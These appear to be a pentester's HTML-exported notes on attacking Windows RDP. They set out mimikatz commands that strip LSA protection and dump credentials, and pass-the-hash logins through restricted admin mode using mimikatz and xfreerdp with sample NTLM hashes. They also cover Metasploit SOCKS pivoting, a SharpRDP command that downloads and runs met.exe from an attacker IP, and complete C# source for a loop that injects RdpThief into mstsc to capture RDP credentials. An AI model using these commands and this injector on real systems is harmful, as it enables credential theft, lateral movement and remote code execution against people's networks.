<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>RDP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>RDP</h1><br/><p><h2>Steal NTLM hash</h2><ul><li>When an RDP connection is created, the NTLM hashes will reside in memory for the duration of the session. </li><li>The session does not terminate without a proper logout, which means simply disconnecting from the sessions will leave the hashes in memory</li><li></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## mimikatz commands first remove lsa protection and then dump passwords</span><br />privilege::debug<br /><span style="color:#ff9d00;font-weight:700">!</span>+<br /><span style="color:#ff9d00;font-weight:700">!</span>processprotect <span style="color:#ff9d00;font-weight:700">/</span>process:lsass.exe <span style="color:#ff9d00;font-weight:700">/</span>remove<br />sekurlsa::logonpasswords<br /><br /></pre></div></p><p></p><p></p><p><h2>RDP restricted admin mode pass the hash</h2></p><p><ul><li>• <small>• Mitigation of stealing hashes : restricted admin mode</small><ul><li><small>network login</small></li><li><small> </small><strong><small> do not require creds (connect as same user)</small></strong></li><li><strong><small>password not stored on memory</small></strong></li><li><small>disables SSO</small></li><li><small>mstsc.exe /restrictedadmin</small></li><li></li></ul></li></ul><img src="images/31-1.png" alt="images/31-1.png" /><ul><li>      ▪ <small>      ▪ disabled by default on the target machine</small></li><li><strong><small>enabled by HKLM:\System\CurrentControlSet\Lsa</small></strong></li></ul></li><li><strong><small>problem: it allows pass the hash</small></strong></li><li><small>restricted admin mode is not enabled by default. However, if we are in possession of a password hash for a local account on the target machine, RDPwe can enable it in order to be able to use a RDP connection to that target.</small><ul><li><small>Enter-PSSession -Computer appsrv01</small></li><li><small>New-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot; -Name DisableRestrictedAdmin -Value 0</small></li></ul></p><p></p><p><div class="codebox"><pre> New-ItemProperty -Path <span style="color:#3ad900;font-weight:400">&quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot;</span> -Name DisableRestrictedAdmin -Value 0<br /><span style="color:#0088ff;font-weight:400">## mimikatz commands for rdp pass the hash </span><br />.<span style="color:#333333;font-weight:400">\m</span>imikatz.exe <span style="color:#3ad900;font-weight:400">&quot;privilege::debug&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:&#39;mstsc.exe /restrictedadmin&#39;&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br /><span style="color:#0088ff;font-weight:400"># estricted admin mode is not enabled by default. However, if we are in possession of a password hash for a local account on the target machine, we can enable it in order to be able to use a RDP connection to that target</span><br /><br /><span style="color:#0088ff;font-weight:400">##n run a powershell instance</span><br />sekurlsa::pth <span style="color:#ff9d00;font-weight:700">/</span>user:admin <span style="color:#ff9d00;font-weight:700">/</span>domain:corp1.com <span style="color:#ff9d00;font-weight:700">/</span>ntlm:2892D26CDF84D7A70E2EB3B9F05C425E <span style="color:#ff9d00;font-weight:700">/</span>run:powershell<br /><span style="color:#0088ff;font-weight:400">## persistence  : enable restricted mode to use pass the hash with rdp</span><br />Enter-Pssession -ComputerName <span style="color:#7f0044;font-weight:400">$target</span><br />New-ItemProperty -Path <span style="color:#3ad900;font-weight:400">&quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot;</span> -Name DisableRestrictedAdmin -Value 0<br /><br /><span style="color:#0088ff;font-weight:400">## with kali xfreerdp suppoirt restricted mode </span><br />xfreerdp /u:admin /pth:d22b080f0d763c02c7b57b80c4f843a4 /v:fs01 /cert-ignore /dynamic-resolution</pre></div></p><p></p><p>if disabled </p><p><img src="images/31-2.png" alt="images/31-2.png" /><ul><li>RDP pass the hash from kali</li><li></li></ul><div class="codebox"><pre>xfreerdp /u:administrator /pth:96b927ecd4785badb8b50bc175c101c4 /v:dc01.corp.com /cert-ignore</pre></div></p><p></p><p></p><p><h2>Reverse RDP Proxying with Metasploit</h2><ul><li>goal : reach internal servers protected by NAT implemented on edge firewalls and build a tunnel on which a rdp session will placed </li></ul></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># after getting a session</span><br />background <br />use multi/manage/autoroute<br /><span style="color:#ff9d00;font-weight:700">set</span> session 1<br />exploit<br /><span style="color:#0088ff;font-weight:400">## allow us to configure a reverse tunnel through the meterpreter session and use that with SOCKS proxy </span><br />use auxiliary/server/socks_proxy<br /><span style="color:#ff9d00;font-weight:700">set</span> srvhost 127.0.0.1<br />run -j <br /><br /> proxychains xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.215.6 /cert-ignore<br /></pre></div></p><p><img src="images/31-3.png" alt="images/31-3.png" /></p><p><h2>RDP as console</h2><ul><li>Sharprdp.exe computername=appsrv01 command=&quot;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.120/met.exe&#39;, &#39;C:\Windows\Tasks\met.exe&#39;); C:\Windows\Tasks\met.exe&quot; username=corp1\dave password=lab</li></ul></p><p></p><p><h2>Stealing creds from rdp session</h2></p><p><a href="https://github.com/0x09AL/RdpThief">https://github.com/0x09AL/RdpThief</a><ul><li>compile dll and use inject dll inside mstsc</li><li>should be executed before the user enters creds </li><li>the app will run while loop and will detect when a rdp session is being launched </li><li>type \Users\dave\Appdata\Local\Temp\3\data.bin</li></ul></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Diagnostics;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Net;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Text;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Threading;<br /><span style="color:#ff9d00;font-weight:700">namespace</span> Inject<br />{<br />    <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr OpenProcess(<span style="color:#7f0044;font-weight:400">uint</span> processAccess, <span style="color:#7f0044;font-weight:400">bool</span> bInheritHandle, <span style="color:#7f0044;font-weight:400">int</span> processId);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#7f0044;font-weight:400">uint</span> dwSize, <span style="color:#7f0044;font-weight:400">uint</span> flAllocationType, <span style="color:#7f0044;font-weight:400">uint</span> flProtect);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, <span style="color:#7f0044;font-weight:400">byte</span>[] lpBuffer, Int32 nSize, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr lpNumberOfBytesWritten);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, <span style="color:#7f0044;font-weight:400">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span style="color:#7f0044;font-weight:400">uint</span> dwCreationFlags, IntPtr lpThreadId);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>, CharSet = CharSet.Ansi, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr GetProcAddress(IntPtr hModule, <span style="color:#7f0044;font-weight:400">string</span> procName);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, CharSet = CharSet.Auto)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr GetModuleHandle(<span style="color:#7f0044;font-weight:400">string</span> lpModuleName);<br /><br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />            {<br />              String dllName = <span style="color:#3ad900;font-weight:400">&quot;C:\\windows\\tasks\\RdpThief.dll&quot;</span>;<br />              <span style="color:#ff9d00;font-weight:700">while</span>(<span style="color:#ff0044;font-weight:400">true</span>)<br />              {<br />                Process[] mstscProc = Process.GetProcessesByName(<span style="color:#3ad900;font-weight:400">&quot;mstsc&quot;</span>);<br />                <span style="color:#ff9d00;font-weight:700">if</span>(mstscProc.Length &gt; <span style="color:#ff0044;font-weight:400">0</span>)<br />                {<br />                  <span style="color:#ff9d00;font-weight:700">for</span>(<span style="color:#7f0044;font-weight:400">int</span> i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; mstscProc.Length; i++)<br />                  {<br />                    <span style="color:#7f0044;font-weight:400">int</span> pid = mstscProc[i].Id;<br /><br />                    IntPtr hProcess = OpenProcess(<span style="color:#ff0044;font-weight:400">0x001F0FFF</span>, <span style="color:#ff0044;font-weight:400">false</span>, pid);<br />                    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0x3000</span>, <span style="color:#ff0044;font-weight:400">0x40</span>);<br />                    IntPtr outSize;<br />                    Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, <span style="color:#ff9d00;font-weight:700">out</span> outSize);<br />                    IntPtr loadLib = GetProcAddress(GetModuleHandle(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>), <span style="color:#3ad900;font-weight:400">&quot;LoadLibraryA&quot;</span>);<br />                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0</span>, loadLib, addr, <span style="color:#ff0044;font-weight:400">0</span>, IntPtr.Zero);<br />                  }<br />                }<br />                               <br />                Thread.Sleep(<span style="color:#ff0044;font-weight:400">1000</span>);<br />              }<br />            }    <br />                <br />    <br />    }<br />}</pre></div></p><p></p><p>aaa</p></div>
</body>
</html>
